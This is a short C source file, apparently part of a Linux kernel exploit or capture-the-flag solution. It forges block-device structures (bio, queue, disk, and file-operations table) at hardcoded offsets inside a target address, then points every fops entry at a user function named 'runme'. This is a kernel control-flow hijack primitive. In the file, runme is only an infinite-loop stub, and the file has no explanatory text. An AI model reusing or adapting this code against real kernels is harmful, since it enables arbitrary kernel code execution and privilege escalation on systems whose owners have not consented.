#include <stdint.h>
#include <stdbool.h>

#define FAKE_STRUCT_SIZE ((0x1000))

void runme(uint64_t rdi, uint64_t rsi, uint64_t rdx) {
    while (true);
}

void setup_fake_bio(uint64_t addr) {
    static uint8_t fake_bdev[FAKE_STRUCT_SIZE];
    static uint8_t fake_queue[FAKE_STRUCT_SIZE];
    static uint8_t fake_disk[FAKE_STRUCT_SIZE];
    static uint8_t fake_disk_fops[FAKE_STRUCT_SIZE];

    for (int i = 0; i < FAKE_STRUCT_SIZE; i++) {
        fake_bdev[i] = 0;
        fake_disk[i] = 0;
        fake_queue[i] = 0;
        fake_disk_fops[i] = 0;
    }

    uint8_t *ptr = (uint8_t *)addr;
    *(uint64_t *)(&ptr[0x34]) = 0;
    *(uint64_t *)(&ptr[0x08]) = (uint64_t)fake_bdev;

    *(uint64_t *)(&fake_bdev[0x340]) = (uint64_t)fake_queue; // 0x4343434343434343;

    *(uint64_t *)(&fake_queue[0x68]) = 0x10000;

    *(uint64_t *)(&fake_queue[0x80]) = (uint64_t)fake_disk;

    *(uint64_t *)(&fake_disk[0x48]) = (uint64_t)fake_disk_fops;

    for (int i = 0; i < 128; i++) {
        ((uint64_t *)fake_disk_fops)[i] = &runme;
    }
}
